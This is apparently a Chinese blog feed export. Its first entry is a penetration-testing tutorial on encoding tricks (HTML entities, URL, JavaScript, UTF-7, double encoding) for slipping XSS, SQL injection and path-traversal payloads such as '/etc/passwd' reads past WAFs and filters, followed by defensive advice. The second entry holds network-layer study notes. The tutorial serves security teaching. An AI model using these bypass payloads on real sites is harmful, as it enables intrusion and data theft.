<li><p><strong>十进制实体</strong>：<code>&amp;#160;</code>、<code>&amp;#60;</code>、<code>&amp;#62;</code></p>
</li>
<li><p><strong>十六进制实体</strong>：<code>&amp;#xA0;</code>、<code>&amp;#x3C;</code>、<code>&amp;#x3E;</code></p>
</li>
<li><p><strong>HTML5新增实体</strong>：更多特殊字符支持</p>
</li>
<li><p><strong>渗透测试应用</strong>：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;<span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#49;</span><span class="symbol">&amp;#41;</span>&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>多层编码绕过过滤器</li>
<li>混合使用不同编码方式</li>
<li>利用浏览器解析差异</li>
</ul>
</li>
<li><p><strong>注意事项</strong>：</p>
<ul>
<li>仅在属性值和文本内容中有效</li>
<li>不能对标签名、属性名进行HTML编码</li>
</ul>
</li>
</ul>
<h3 id="3-3-URL编码"><a href="#3-3-URL编码" class="headerlink" title="3.3 URL编码"></a>3.3 URL编码</h3><ul>
<li><p><strong>标准</strong>：RFC 3986</p>
</li>
<li><p><strong>编码规则</strong>：</p>
<ul>
<li>保留字符（如<code>!</code>, <code>*</code>, <code>&#39;</code>, <code>(</code>, <code>)</code>, <code>;</code>, <code>:</code>, <code>@</code>, <code>&amp;</code>, <code>=</code>, <code>+</code>, <code>$</code>, <code>,</code>, <code>/</code>, <code>?</code>, <code>#</code>, <code>[</code>, <code>]</code>）需要编码</li>
<li>非ASCII字符必须编码</li>
<li>空格编码为<code>+</code>或<code>%20</code></li>
</ul>
</li>
<li><p><strong>渗透测试应用</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/index.php?keyword=aa%20union%20select</span><br></pre></td></tr></table></figure>
<ul>
<li>绕过基于关键字的过滤</li>
<li>多次URL编码绕过WAF</li>
<li>混合编码技术（如先Base64再URL编码）</li>
</ul>
</li>
</ul>
<h3 id="3-4-JavaScript编码"><a href="#3-4-JavaScript编码" class="headerlink" title="3.4 JavaScript编码"></a>3.4 JavaScript编码</h3><ul>
<li><p><strong>十六进制编码</strong>：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">\x3C\x73\x63\x72\x69\x70\x74\<span class="title function_">x3Ealert</span>(<span class="number">1</span>)\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>八进制编码</strong>：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">\<span class="number">74</span>\<span class="number">163</span>\<span class="number">143</span>\<span class="number">162</span>\<span class="number">151</span>\<span class="number">160</span>\<span class="number">164</span>\76alert(<span class="number">1</span>)\<span class="number">74</span>\<span class="number">57</span>\<span class="number">163</span>\<span class="number">143</span>\<span class="number">162</span>\<span class="number">151</span>\<span class="number">160</span>\<span class="number">164</span>\<span class="number">76</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Unicode编码</strong>：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">\u003c\u0073\u0063\u0072\u0069\u0070\u0074\<span class="title function_">u003ealert</span>(<span class="number">1</span>)\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>渗透测试应用</strong>：</p>
<ul>
<li>绕过基于关键字的JS过滤</li>
<li>混合编码实现高级XSS</li>
<li>利用<code>&lt;script&gt;</code>标签的编码绕过</li>
</ul>
</li>
</ul>
<h3 id="3-5-CSS编码"><a href="#3-5-CSS编码" class="headerlink" title="3.5 CSS编码"></a>3.5 CSS编码</h3><ul>
<li><strong>Unicode编码</strong>：<code>\0000</code>格式</li>
<li><strong>十六进制编码</strong>：<code>\0000</code>或<code>\x0000</code></li>
<li><strong>渗透测试应用</strong>：<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123; <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">&#x27;\x68\x74\x74\x70\x3a\x2f\x2f\x65\x78\x61\x6d\x70\x6c\x65\x2e\x63\x6f\x6d&#x27;</span>); &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>CSS注入攻击</li>
<li>绕过内容安全策略(CSP)</li>
</ul>
</li>
</ul>
<h2 id="四、数据传输编码"><a href="#四、数据传输编码" class="headerlink" title="四、数据传输编码"></a>四、数据传输编码</h2><h3 id="4-1-Base64编码"><a href="#4-1-Base64编码" class="headerlink" title="4.1 Base64编码"></a>4.1 Base64编码</h3><ul>
<li><p><strong>原理</strong>：将二进制数据转换为64个可打印ASCII字符</p>
</li>
<li><p><strong>标准</strong>：RFC 4648</p>
</li>
<li><p><strong>特点</strong>：</p>
<ul>
<li>编码后数据量增加约33%</li>
<li>末尾可能有1-2个<code>=</code>作为填充</li>
<li>URL安全变种使用<code>-</code>和<code>_</code>代替<code>+</code>和<code>/</code></li>
</ul>
</li>
<li><p><strong>渗透测试应用</strong>：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&#x27;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>隐藏恶意脚本</li>
<li>绕过基于关键字的过滤</li>
<li>多层编码（Base64 + URL编码）</li>
</ul>
</li>
</ul>
<h3 id="4-2-Hex编码"><a href="#4-2-Hex编码" class="headerlink" title="4.2 Hex编码"></a>4.2 Hex编码</h3><ul>
<li><p><strong>原理</strong>：将每个字节转换为两位十六进制数</p>
</li>
<li><p><strong>数据库应用</strong>：MySQL中使用<code>0x</code>前缀</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">0x48656C6C6F</span>; <span class="comment">-- 输出Hello</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>渗透测试应用</strong>：</p>
<ul>
<li>SQL注入绕过</li>
<li>文件内容十六进制表示</li>
<li>混合编码绕过过滤</li>
</ul>
</li>
</ul>
<h3 id="4-3-UUEncode"><a href="#4-3-UUEncode" class="headerlink" title="4.3 UUEncode"></a>4.3 UUEncode</h3><ul>
<li><strong>历史</strong>：早期用于Unix系统间邮件传输</li>
<li><strong>特点</strong>：将3字节转换为4个可打印字符</li>
<li><strong>渗透测试应用</strong>：在遗留系统中可能发现的编码方式</li>
</ul>
<h3 id="4-4-Quoted-Printable"><a href="#4-4-Quoted-Printable" class="headerlink" title="4.4 Quoted-Printable"></a>4.4 Quoted-Printable</h3><ul>
<li><p><strong>标准</strong>：RFC 2045，用于MIME编码</p>
</li>
<li><p><strong>特点</strong>：</p>
<ul>
<li>保留可打印ASCII字符</li>
<li>非ASCII字符和特殊字符编码为<code>=</code>后跟两位十六进制</li>
<li>每行不超过76字符</li>
</ul>
</li>
<li><p><strong>渗透测试应用</strong>：</p>
<ul>
<li>邮件系统漏洞利用</li>
<li>绕过基于内容的过滤</li>
</ul>
</li>
</ul>
<h2 id="五、数据结构编码"><a href="#五、数据结构编码" class="headerlink" title="五、数据结构编码"></a>五、数据结构编码</h2><h3 id="5-1-JSON编码"><a href="#5-1-JSON编码" class="headerlink" title="5.1 JSON编码"></a>5.1 JSON编码</h3><ul>
<li><p><strong>标准</strong>：RFC 8259</p>
</li>
<li><p><strong>特点</strong>：</p>
<ul>
<li>轻量级数据交换格式</li>
<li>支持对象、数组、字符串、数字、布尔值和null</li>
<li>严格的语法要求</li>
</ul>
</li>
<li><p><strong>渗透测试应用</strong>：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;Name&quot;</span><span class="punctuation">:</span><span class="string">&quot;a1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Number&quot;</span><span class="punctuation">:</span><span class="string">&quot;123&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Contno&quot;</span><span class="punctuation">:</span><span class="string">&quot;000&quot;</span><span class="punctuation">,</span><span class="attr">&quot;QQNo&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
<ul>
<li>JSON注入攻击</li>
<li>利用解析差异实施攻击</li>
<li>通过编码绕过JSON验证</li>
</ul>
</li>
</ul>
<h3 id="5-2-XML编码"><a href="#5-2-XML编码" class="headerlink" title="5.2 XML编码"></a>5.2 XML编码</h3><ul>
<li><strong>实体编码</strong>：<code>&amp;lt;</code>, <code>&amp;gt;</code>, <code>&amp;amp;</code>等</li>
<li><strong>CDATA</strong>：<code>&lt;![CDATA[...]]&gt;</code>区域</li>
<li><strong>渗透测试应用</strong>：<ul>
<li>XXE（XML External Entity）攻击</li>
<li>利用编码绕过XML解析器</li>
<li>混合编码实现高级攻击</li>
</ul>
</li>
</ul>
<h3 id="5-3-序列化"><a href="#5-3-序列化" class="headerlink" title="5.3 序列化"></a>5.3 序列化</h3><ul>
<li><p><strong>PHP序列化</strong>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;i:<span class="number">0</span>;s:<span class="number">3</span>:<span class="string">&quot;Moe&quot;</span>;i:<span class="number">1</span>;s:<span class="number">5</span>:<span class="string">&quot;Larry&quot;</span>;i:<span class="number">2</span>;s:<span class="number">5</span>:<span class="string">&quot;Curly&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>a</code>表示数组，<code>i</code>表示整数，<code>s</code>表示字符串</li>
</ul>
</li>
<li><p><strong>Java序列化</strong>：二进制格式，易受反序列化漏洞影响</p>
</li>
<li><p><strong>Python Pickle</strong>：类似Java序列化，存在安全风险</p>
</li>
<li><p><strong>渗透测试应用</strong>：</p>
<ul>
<li>反序列化漏洞利用</li>
<li>操作序列化数据实现远程代码执行</li>
<li>绕过基于结构的过滤</li>
</ul>
</li>
</ul>
<h2 id="六、特殊编码技术"><a href="#六、特殊编码技术" class="headerlink" title="六、特殊编码技术"></a>六、特殊编码技术</h2><h3 id="6-1-UTF-7编码"><a href="#6-1-UTF-7编码" class="headerlink" title="6.1 UTF-7编码"></a>6.1 UTF-7编码</h3><ul>
<li><strong>历史</strong>：设计用于在7位传输通道中传输Unicode</li>
<li><strong>特点</strong>：使用<code>+</code>开头的编码序列</li>
<li><strong>渗透测试应用</strong>：<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;moonsec +AG0AbwBv-n+AHM-e+AGM-&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>绕过基于ASCII的过滤器</li>
<li>XSS攻击中的经典绕过技术</li>
<li>现代浏览器已逐渐弃用，但在旧系统中仍有效</li>
</ul>
</li>
</ul>
<h3 id="6-2-Punycode"><a href="#6-2-Punycode" class="headerlink" title="6.2 Punycode"></a>6.2 Punycode</h3><ul>
<li><strong>标准</strong>：RFC 3492</li>
<li><strong>用途</strong>：将国际化域名转换为ASCII兼容格式</li>
<li><strong>渗透测试应用</strong>：<ul>
<li>IDN欺骗（同形异义字攻击）</li>
<li>钓鱼网站构造</li>
<li>例如：<code>xn--80ak6aa92e.com</code> 可能显示为 “аpple.com”（使用西里尔字母а）</li>
</ul>
</li>
</ul>
<h3 id="6-3-Double-Encoding（双重编码）"><a href="#6-3-Double-Encoding（双重编码）" class="headerlink" title="6.3 Double Encoding（双重编码）"></a>6.3 Double Encoding（双重编码）</h3><ul>
<li><strong>原理</strong>：对同一数据进行两次相同或不同的编码</li>
<li><strong>渗透测试应用</strong>：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%253Cscript%253Ealert(1)%253C/script%253E</span><br></pre></td></tr></table></figure>
<ul>
<li>第一次解码：<code>%3Cscript%3Ealert(1)%3C/script%3E</code></li>
<li>第二次解码：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li>绕过仅进行单次解码的WAF</li>
</ul>
</li>
</ul>
<h3 id="6-4-Mixed-Encoding（混合编码）"><a href="#6-4-Mixed-Encoding（混合编码）" class="headerlink" title="6.4 Mixed Encoding（混合编码）"></a>6.4 Mixed Encoding（混合编码）</h3><ul>
<li><strong>原理</strong>：结合多种编码方式</li>
<li><strong>渗透测试应用</strong>：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%25%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E</span><br></pre></td></tr></table></figure>
<ul>
<li>URL编码 + HTML编码混合</li>
<li>绕过多层过滤系统</li>
</ul>
</li>
</ul>
<h2 id="七、编码在渗透测试中的实际应用"><a href="#七、编码在渗透测试中的实际应用" class="headerlink" title="七、编码在渗透测试中的实际应用"></a>七、编码在渗透测试中的实际应用</h2><h3 id="7-1-绕过WAF"><a href="#7-1-绕过WAF" class="headerlink" title="7.1 绕过WAF"></a>7.1 绕过WAF</h3><ul>
<li><strong>多层编码</strong>：对同一内容进行多次编码</li>
<li><strong>混合编码</strong>：结合URL、HTML、JS等多种编码</li>
<li><strong>大小写混淆</strong>：利用WAF大小写敏感性</li>
<li><strong>空格替换</strong>：用<code>%09</code>(TAB)、<code>%0A</code>(换行)等代替空格</li>
</ul>
<h3 id="7-2-XSS攻击"><a href="#7-2-XSS攻击" class="headerlink" title="7.2 XSS攻击"></a>7.2 XSS攻击</h3><ul>
<li><strong>HTML编码绕过</strong>：<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;<span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x6c;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x28;</span><span class="symbol">&amp;#x31;</span><span class="symbol">&amp;#x29;</span>&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><strong>JS编码绕过</strong>：<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">\u0061\u006c\u0065\u0072\<span class="title function_">u0074</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></li>
<li><strong>混合编码</strong>：<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(&#x27;\x61\x6c\x65\x72\x74\x28\x31\x29&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="7-3-SQL注入"><a href="#7-3-SQL注入" class="headerlink" title="7.3 SQL注入"></a>7.3 SQL注入</h3><ul>
<li><strong>Hex编码绕过</strong>：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="number">0x61646D696E</span></span><br></pre></td></tr></table></figure></li>
<li><strong>URL编码绕过</strong>：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UNION</span><span class="operator">%</span><span class="number">20</span><span class="keyword">SELECT</span><span class="operator">%</span><span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure></li>
<li><strong>双重编码绕过</strong>：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="number">2527</span><span class="operator">%</span><span class="number">20</span><span class="keyword">OR</span><span class="operator">%</span><span class="number">201</span><span class="operator">%</span><span class="number">3</span>D1<span class="comment">--</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="7-4-文件包含漏洞"><a href="#7-4-文件包含漏洞" class="headerlink" title="7.4 文件包含漏洞"></a>7.4 文件包含漏洞</h3><ul>
<li><strong>编码路径遍历</strong>：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=..%2f..%2fetc%2fpasswd</span><br></pre></td></tr></table></figure></li>
<li><strong>混合编码绕过</strong>：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=%252e%252e%252fetc%252fpasswd</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="八、编码工具推荐"><a href="#八、编码工具推荐" class="headerlink" title="八、编码工具推荐"></a>八、编码工具推荐</h2><h3 id="8-1-在线工具"><a href="#8-1-在线工具" class="headerlink" title="8.1 在线工具"></a>8.1 在线工具</h3><ul>
<li><strong>CyberChef</strong>：多功能编码&#x2F;解码工具，支持超过200种操作</li>
<li><strong>URLDecoder</strong>：专门用于URL编码解码</li>
<li><strong>Base64decode</strong>：Base64编码解码</li>
<li><strong>Unicode Escape</strong>：Unicode编码转换</li>
<li><strong>XSS Encoder</strong>：专门用于XSS测试的编码工具</li>
</ul>
<h3 id="8-2-浏览器插件"><a href="#8-2-浏览器插件" class="headerlink" title="8.2 浏览器插件"></a>8.2 浏览器插件</h3><ul>
<li><strong>HackBar</strong>：多功能安全测试工具，包含编码功能</li>
<li><strong>Burp Suite Encoder</strong>：集成在Burp Suite中的编码工具</li>
<li><strong>XSStrike</strong>：XSS检测工具，包含编码绕过功能</li>
</ul>
<h3 id="8-3-命令行工具"><a href="#8-3-命令行工具" class="headerlink" title="8.3 命令行工具"></a>8.3 命令行工具</h3><ul>
<li><strong>Python</strong>：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">urllib.parse.quote(<span class="string">&quot;test string&quot;</span>)</span><br></pre></td></tr></table></figure></li>
<li><strong>JavaScript (Node.js)</strong>：<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">encodeURIComponent</span>(<span class="string">&quot;test string&quot;</span>)</span><br></pre></td></tr></table></figure></li>
<li><strong>Linux命令</strong>：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Hello&quot;</span> | <span class="built_in">base64</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="九、防御建议"><a href="#九、防御建议" class="headerlink" title="九、防御建议"></a>九、防御建议</h2><h3 id="9-1-安全编码实践"><a href="#9-1-安全编码实践" class="headerlink" title="9.1 安全编码实践"></a>9.1 安全编码实践</h3><ul>
<li><strong>输入规范化</strong>：在处理前将输入转换为标准格式</li>
<li><strong>多层解码检查</strong>：避免仅进行单次解码</li>
<li><strong>白名单过滤</strong>：允许已知安全的字符，拒绝其他所有</li>
<li><strong>内容安全策略(CSP)</strong>：限制脚本执行来源</li>
</ul>
<h3 id="9-2-WAF配置建议"><a href="#9-2-WAF配置建议" class="headerlink" title="9.2 WAF配置建议"></a>9.2 WAF配置建议</h3><ul>
<li><strong>多层解码</strong>：确保WAF能够处理多层编码</li>
<li><strong>正则表达式优化</strong>：使用更智能的模式匹配</li>
<li><strong>上下文感知</strong>：根据不同输入位置应用不同规则</li>
<li><strong>定期更新规则</strong>：跟上新的编码绕过技术</li>
</ul>
<h3 id="9-3-安全开发建议"><a href="#9-3-安全开发建议" class="headerlink" title="9.3 安全开发建议"></a>9.3 安全开发建议</h3><ul>
<li><strong>使用安全API</strong>：避免手动处理编码&#x2F;解码</li>
<li><strong>输出编码</strong>：在输出到不同上下文时使用适当编码</li>
<li><strong>安全库使用</strong>：使用经过验证的安全库处理用户输入</li>
<li><strong>安全测试</strong>：包括对编码绕过技术的测试</li>
</ul>
<h2 id="十、编码绕过案例研究"><a href="#十、编码绕过案例研究" class="headerlink" title="十、编码绕过案例研究"></a>十、编码绕过案例研究</h2><h3 id="10-1-经典XSS双重编码绕过"><a href="#10-1-经典XSS双重编码绕过" class="headerlink" title="10.1 经典XSS双重编码绕过"></a>10.1 经典XSS双重编码绕过</h3><ul>
<li><strong>原始payload</strong>：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li><strong>双重URL编码</strong>：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%253Cscript%253Ealert(1)%253C%252Fscript%253E</span><br></pre></td></tr></table></figure></li>
<li><strong>WAF行为</strong>：仅进行一次URL解码，得到<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，仍然被过滤</li>
<li><strong>浏览器行为</strong>：进行两次URL解码，最终执行脚本</li>
</ul>
<h3 id="10-2-SQL注入Hex编码绕过"><a href="#10-2-SQL注入Hex编码绕过" class="headerlink" title="10.2 SQL注入Hex编码绕过"></a>10.2 SQL注入Hex编码绕过</h3><ul>
<li><strong>原始payload</strong>：<code>&#39; OR 1=1 --</code></li>
<li><strong>Hex编码</strong>：<code>0x27204F5220313D31202D2D</code></li>
<li><strong>绕过原理</strong>：某些WAF无法识别Hex编码的SQL注入</li>
</ul>
<h3 id="10-3-UTF-7-XSS攻击"><a href="#10-3-UTF-7-XSS攻击" class="headerlink" title="10.3 UTF-7 XSS攻击"></a>10.3 UTF-7 XSS攻击</h3><ul>
<li><strong>payload</strong>：<code>+ADw-script+AD4-alert(1)+ADw-/script+AD4-</code></li>
<li><strong>绕过原理</strong>：旧版IE将UTF-7内容视为脚本执行</li>
<li><strong>现代影响</strong>：虽然现代浏览器已弃用UTF-7，但某些中间件可能仍存在风险</li>
</ul>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>编码技术</tag>
      </tags>
  </entry>
  <entry>
    <title>第 4 章 网络层</title>
    <url>/2025/12/05/%E7%BD%91%E7%BB%9C%E5%B1%82/</url>
    <content><![CDATA[<h2 id="4-1-网络层的功能"><a href="#4-1-网络层的功能" class="headerlink" title="4.1   网络层的功能"></a>4.1   网络层的功能</h2><h3 id="4-1-1-异构网络互连"><a href="#4-1-1-异构网络互连" class="headerlink" title="4.1.1   异构网络互连"></a>4.1.1   异构网络互连</h3><ul>
<li>定义<ul>
<li>互联网由全球范围内数以百万计的异构网络互连</li>
<li>网络层任务之一是实现异构网络互连</li>
<li>网络互连：将两个以上计算机网络通过中继系统相互连接</li>
</ul>
</li>
<li>中继系统分类（按层次）<ul>
<li>物理层中继系统<ul>
<li>转发器</li>
<li>集线器</li>
</ul>
</li>
<li>数据链路层中继系统<ul>
<li>网桥</li>
<li>交换机</li>
</ul>
</li>
<li>网络层中继系统<ul>
<li>路由器</li>
</ul>
</li>
<li>网络层以上中继系统<ul>
<li>网关</li>
</ul>
</li>
</ul>
</li>
<li>网络互连特点<ul>
<li>通常指用路由器进行连接和路由选择</li>
<li>路由器是专用计算机</li>
<li>历史原因：路由器有时被称为网关</li>
</ul>
</li>
<li>TCP&#x2F;IP网络互连方案<ul>
<li>网络层采用标准化协议</li>
<li>可连接异构网络</li>
<li>IP网络概念<ul>
<li>实际互连网络（通过路由器连接）</li>
<li>虚拟IP网络（统一网络视图）</li>
</ul>
</li>
</ul>
</li>
<li>IP网络优势<ul>
<li>主机通信时如同在单个网络上</li>
<li>隐藏底层网络异构细节</li>
</ul>
</li>
</ul>
<h3 id="4-1-2-路由与转发"><a href="#4-1-2-路由与转发" class="headerlink" title="4.1.2   路由与转发"></a>4.1.2   路由与转发</h3><ul>
<li>路由器主要完成两个功能<ul>
<li>路由选择(确定哪一条路径)<ul>
<li>根据路由选择协议构造并维护路由表</li>
<li>经常或定期与相邻路由器交换信息</li>
<li>获取网络最新拓扑</li>
<li>动态更新维护路由表</li>
<li>决定分组到达目的地节点的最优路径</li>
</ul>
</li>
<li>分组转发(分组到达时所采取的动作)<ul>
<li>处理通过路由器的数据流</li>
<li>关键操作<ul>
<li>转发表查询</li>
<li>转发</li>
<li>队列管理</li>
<li>任务调度</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>路由表与转发表的关系<ul>
<li>路由表根据路由选择算法得出</li>
<li>转发表从路由表得出</li>
<li>转发表结构优化查找过程</li>
<li>路由表优化网络拓扑变化计算</li>
</ul>
</li>
<li>注意<ul>
<li>讨论路由选择原理时<ul>
<li>不区分转发表和路由表</li>
<li>笼统使用路由表一词</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="4-1-3-网络层提供的两种服务"><a href="#4-1-3-网络层提供的两种服务" class="headerlink" title="4.1.3    网络层提供的两种服务"></a>4.1.3    网络层提供的两种服务</h3><ul>
<li><p>网络层提供两种通信服务方式</p>
<ul>
<li>面向连接的虚电路服务</li>
<li>无连接的数据报服务</li>
</ul>
</li>
<li><p>①. 虚电路（Virtual Circuit, VC）</p>
<ul>
<li>基本概念<ul>
<li>计算机通信前先建立网络层连接</li>
<li>连接是一条逻辑上的路径（非物理专用）</li>
<li>分为三个阶段：建立、传输、释放</li>
</ul>
</li>
<li>虚电路号（VCID）<ul>
<li>每次建立时分配唯一编号</li>
<li>区分不同虚电路</li>
</ul>
</li>
<li>数据传输特点<ul>
<li>首部仅携带VCID，不重复目的地址</li>
<li>每个节点维护虚电路表<ul>
<li>包含VCID、入链路、出链路、前后节点等信息</li>
</ul>
</li>
</ul>
</li>
<li>工作流程<ul>
<li>建立连接：发送“呼叫请求”分组 → 接收方确认“呼叫应答”</li>
<li>数据传输：通过已建立路径传输数据分组</li>
<li>释放连接：发送“释放请求”分组 → 逐段拆除连接</li>
</ul>
</li>
<li>特点总结<ul>
<li>建立&#x2F;拆除需要开销，适合长时间频繁通信</li>
<li>路由选择在连接建立时确定</li>
<li>提供可靠传输、有序到达、流量控制</li>
<li>对网络故障适应性差<ul>
<li>节点或链路失效 → 所有相关虚电路中断</li>
</ul>
</li>
<li>分组首部开销小（只用VCID）</li>
</ul>
</li>
</ul>
</li>
<li><p>②. 数据报（Datagram）</p>
<ul>
<li>基本概念<ul>
<li>发送前不需要建立连接</li>
<li>每个分组独立路由转发</li>
<li>网络层不承诺服务质量</li>
</ul>
</li>
<li>数据传输特点<ul>
<li>每个分组包含完整源和目的地址</li>
<li>中间节点缓存并查找转发表进行转发</li>
<li>不保证顺序、可靠性、流量控制</li>
</ul>
</li>
<li>工作流程<ul>
<li>主机A将分组发给相邻交换节点A</li>
<li>节点A查找转发表决定下一跳</li>
<li>其他节点类似转发，直到到达主机B</li>
</ul>
</li>
<li>特点总结<ul>
<li>无需连接建立，灵活高效</li>
<li>尽最大努力交付，可能出错、丢失、乱序</li>
<li>支持资源复用，利用率高</li>
<li>对网络故障适应性强<ul>
<li>可动态更新路由避开故障节点</li>
</ul>
</li>
<li>分组需排队转发，可能造成延迟或丢包</li>
</ul>
</li>
</ul>
</li>
<li><p>③. 数据报服务与虚电路服务比较</p>
<ul>
<li>连接的建立<ul>
<li>数据报服务：不需要</li>
<li>虚电路服务：必须有</li>
</ul>
</li>
<li>目的地址<ul>
<li>数据报服务：每个分组都有完整的目的地址</li>
<li>虚电路服务：连接阶段</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="4-1-4-SDN-的基本概念"><a href="#4-1-4-SDN-的基本概念" class="headerlink" title="4.1.4   SDN 的基本概念"></a>4.1.4   SDN 的基本概念</h3><ul>
<li>网络层抽象划分<ul>
<li>数据平面（转发层面）<ul>
<li>功能：转发</li>
</ul>
</li>
<li>控制平面<ul>
<li>功能：路由选择</li>
</ul>
</li>
</ul>
</li>
<li>SDN架构特点<ul>
<li>集中式的控制平面</li>
<li>分布式的数据平面</li>
<li>控制平面与数据平面分离</li>
<li>控制平面通过控制-数据接口集中控制路由器</li>
</ul>
</li>
<li>传统路由器 vs SDN路由器<ul>
<li>传统路由器<ul>
<li>包含转发表和路由选择软件</li>
<li>既有数据平面又有控制平面</li>
</ul>
</li>
<li>SDN路由器<ul>
<li>简化设计</li>
<li>无需路由选择软件</li>
<li>路由器间不交换路由信息</li>
</ul>
</li>
</ul>
</li>
<li>SDN结构<ul>
<li>远程控制器<ul>
<li>逻辑上的控制中心</li>
<li>掌握网络状态</li>
<li>计算最佳路由</li>
<li>通过Openflow协议下发流表</li>
</ul>
</li>
<li>路由器工作流程<ul>
<li>收到分组</li>
<li>查找转发表</li>
<li>转发分组</li>
</ul>
</li>
</ul>
</li>
<li>SDN应用场景<ul>
<li>大型数据中心之间的广域网</li>
</ul>
</li>
<li>SDN接口<ul>
<li>北向接口<ul>
<li>面向应用开发者的编程接口</li>
<li>提供丰富API</li>
</ul>
</li>
<li>南向接口<ul>
<li>控制器与转发设备间的双向会话接口</li>
<li>协议示例：Openflow</li>
</ul>
</li>
<li>东西向接口<ul>
<li>控制器集群内部通信接口</li>
</ul>
</li>
</ul>
</li>
<li>SDN优点<ul>
<li>全局集中式控制和分布式高速转发</li>
<li>灵活可编程与性能的平衡</li>
<li>降低成本</li>
</ul>
</li>
<li>SDN问题<ul>
<li>安全风险<ul>
<li>集中管理易受攻击</li>
</ul>
</li>
<li>瓶颈问题<ul>
<li>控制器可能成为性能瓶颈</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="4-1-5-拥塞控制"><a href="#4-1-5-拥塞控制" class="headerlink" title="4.1.5    拥塞控制"></a>4.1.5    拥塞控制</h3><ul>
<li>定义<ul>
<li>因出现过量的分组而引起网络性能下降的现象</li>
</ul>
</li>
<li>判断方法<ul>
<li>观察吞吐量与网络负载的关系<ul>
<li>轻度拥塞：吞吐量明显小于正常值</li>
<li>拥塞状态：吞吐量随负载增大而下降</li>
